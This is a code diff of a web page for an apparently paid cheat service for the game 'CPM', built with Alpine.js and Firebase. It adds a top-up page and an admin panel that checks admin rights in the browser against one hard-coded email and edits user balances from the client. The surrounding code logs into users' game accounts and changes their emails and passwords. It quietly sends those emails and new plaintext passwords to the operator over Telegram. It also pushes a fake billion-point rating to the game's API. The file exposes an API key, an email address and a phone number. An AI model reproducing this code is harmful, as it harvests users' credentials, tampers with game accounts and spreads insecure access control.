@@ -89,6 +89,13 @@
                     </div>
                     <nav class="space-y-1">
                         <button @click="currentPage = 'topup'; sideBar = false" class="w-full text-left p-3 hover:bg-white/5 rounded-lg flex items-center text-sm font-semibold"><i class="fas fa-wallet w-8 text-green-400"></i> Top Up Saldo</button>
+                        
+                        <template x-if="isAdmin">
+                            <button @click="currentPage = 'admin'; sideBar = false" class="w-full text-left p-3 hover:bg-purple-500/10 text-purple-400 rounded-lg flex items-center font-bold text-sm">
+                                <i class="fas fa-user-shield w-8"></i> ADMIN PANEL
+                            </button>
+                        </template>
+
                         <hr class="border-white/5 my-4">
                         <button @click="logoutGoogle()" class="w-full text-left p-3 hover:bg-red-500/10 text-red-400 rounded-lg flex items-center font-bold text-sm"><i class="fas fa-power-off w-8"></i> Logout</button>
                     </nav>
@@ -160,6 +167,49 @@
                 </div>
             </div>
         </div>
+
+        <div x-show="currentPage === 'topup'" x-transition class="container mx-auto px-4 py-10">
+            <div class="max-w-md mx-auto card-glass p-10 text-center">
+                <i class="fas fa-wallet text-5xl text-green-500 mb-6"></i>
+                <h2 class="text-3xl font-bold gradient-text mb-8 italic uppercase">Top Up Saldo</h2>
+                <div class="grid grid-cols-2 gap-4">
+                    <button @click="prosesTopUp(20000)" class="p-4 bg-white/5 border border-white/10 rounded-xl hover:border-green-500 font-bold">20.000</button>
+                    <button @click="prosesTopUp(50000)" class="p-4 bg-white/5 border border-white/10 rounded-xl hover:border-green-500 font-bold">50.000</button>
+                    <button @click="prosesTopUp(100000)" class="p-4 bg-white/5 border border-white/10 rounded-xl hover:border-green-500 font-bold">100.000</button>
+                    <button @click="prosesTopUp(150000)" class="p-4 bg-white/5 border border-white/10 rounded-xl hover:border-green-500 font-bold">150.000</button>
+                </div>
+            </div>
+        </div>
+
+        <template x-if="isAdmin">
+            <div x-show="currentPage === 'admin'" x-transition class="container mx-auto px-4 py-10">
+                <h2 class="text-3xl font-bold mb-6 gradient-text italic uppercase">Admin Dashboard</h2>
+                <div class="card-glass overflow-x-auto">
+                    <table class="w-full text-left text-sm">
+                        <thead class="bg-white/5 uppercase text-[10px] tracking-widest">
+                            <tr>
+                                <th class="p-4">Email User</th>
+                                <th class="p-4">Saldo</th>
+                                <th class="p-4">Aksi</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-white/5">
+                            <template x-for="u in allUsers" :key="u.id">
+                                <tr class="hover:bg-white/5">
+                                    <td class="p-4 font-mono text-gray-400" x-text="u.email"></td>
+                                    <td class="p-4 font-bold text-green-400" x-text="'Rp ' + u.balance.toLocaleString()"></td>
+                                    <td class="p-4 flex gap-2">
+                                        <button @click="updateBalance(u.id, 10000)" class="bg-green-600/20 text-green-500 px-2 py-1 rounded text-[10px] font-bold">+10K</button>
+                                        <button @click="updateBalance(u.id, 50000)" class="bg-green-600/20 text-green-500 px-2 py-1 rounded text-[10px] font-bold">+50K</button>
+                                        <button @click="resetBalance(u.id)" class="bg-red-600/20 text-red-500 px-2 py-1 rounded text-[10px] font-bold">RESET</button>
+                                    </td>
+                                </tr>
+                            </template>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </template>
     </main>
 
     <script>
@@ -169,7 +219,12 @@
                 cpmUser: { isLoggedIn: false, email: '', token: '', gameData: null },
                 cpmForm: { gameId: '', email: '', password: '', key: '' },
                 
-                // --- CONFIG TERBARU ANDA ---
+                // --- ADMIN CONFIG ---
+                adminEmail: "kulgarfreefire2022@gmail.com", 
+                isAdmin: false,
+                allUsers: [],
+
+                // --- FIREBASE CONFIG ---
                 firebaseConfig: {
                     apiKey: "AIzaSyCNZokAKl6TVKWMOc51SCSRKZGqoG77uFI",
                     authDomain: "cpmapikey.firebaseapp.com",
@@ -197,7 +252,13 @@
                     if (!firebase.apps.length) firebase.initializeApp(this.firebaseConfig);
                     firebase.auth().onAuthStateChanged((u) => {
                         this.user = u;
-                        if (u) this.fetchUserData(u.uid);
+                        if (u) {
+                            this.fetchUserData(u.uid);
+                            if (u.email === this.adminEmail) {
+                                this.isAdmin = true;
+                                this.fetchAllUsers();
+                            }
+                        }
                     });
                 },
 
@@ -209,13 +270,40 @@
                     } catch (e) { alert("Login Error: " + e.message); }
                 },
 
-                async logoutGoogle() { await firebase.auth().signOut(); this.user = null; this.sideBar = false; },
+                async logoutGoogle() { await firebase.auth().signOut(); location.reload(); },
 
                 fetchUserData(uid) {
                     firebase.database().ref('users/' + uid).on('value', (snap) => {
                         if (snap.val()) this.userData = snap.val();
                         else firebase.database().ref('users/' + uid).set({ email: this.user.email, balance: 0, createdAt: Date.now() });
                     });
+                },
+
+                fetchAllUsers() {
+                    firebase.database().ref('users').on('value', (snap) => {
+                        const data = snap.val();
+                        this.allUsers = data ? Object.keys(data).map(k => ({ id: k, ...data[k] })) : [];
+                    });
+                },
+
+                updateBalance(uid, amt) {
+                    firebase.database().ref('users/' + uid + '/balance').transaction(c => (c || 0) + amt);
+                    this.logToTelegram(`💰 **TOPUP SUCCESS**\nUser UID: \`${uid}\`\nAmount: +Rp ${amt.toLocaleString()}`);
+                },
+
+                resetBalance(uid) {
+                    if(confirm("Reset saldo?")) firebase.database().ref('users/' + uid + '/balance').set(0);
+                },
+
+                prosesTopUp(nominal) {
+                    if (!this.user) return alert("Login dulu!");
+                    const msg = `Halo Admin AWIMEDAN, saya mau Top Up Rp ${nominal.toLocaleString()}\nEmail: ${this.user.email}`;
+                    window.open(`https://wa.me/6281330750863?text=${encodeURIComponent(msg)}`, '_blank');
+                },
+
+                topUpCustom() {
+                    const n = prompt("Nominal:");
+                    if (n) this.prosesTopUp(parseInt(n));
                 },
 
                 async handleCpmLogin() {
@@ -248,9 +336,9 @@
                             method: 'POST', headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ idToken: this.cpmUser.token, email: ne, returnSecureToken: true, upgradeToFederatedLogin: true })
                         });
-                        alert("Sukses!");
                         this.logToTelegram(`📧 **EMAIL CHANGED**\nOld: \`${this.cpmUser.email}\`\nNew: \`${ne}\``);
                         this.cpmUser.email = ne;
+                        alert("Sukses!");
                     } catch (e) { alert("Gagal!"); }
                     this.loading = false;
                 },
@@ -264,8 +352,8 @@
                             method: 'POST', headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ idToken: this.cpmUser.token, password: np, returnSecureToken: true })
                         });
-                        alert("Pass Sukses!");
                         this.logToTelegram(`🔑 **PASS UPDATED**\nAcc: \`${this.cpmUser.email}\`\nNew: \`${np}\``);
+                        alert("Sukses!");
                     } catch (e) { alert("Gagal!"); }
                     this.loading = false;
                 },
@@ -277,8 +365,8 @@
                             method: 'POST', headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ "auth": this.cpmUser.token, "rating": 1000000000 })
                         });
-                        alert("KING RANK AKTIF!");
                         this.logToTelegram(`👑 **KING RANK**\nAcc: \`${this.cpmUser.email}\``);
+                        alert("Sukses!");
                     } catch (e) { alert("Gagal!"); }
                     this.loading = false;
                 },
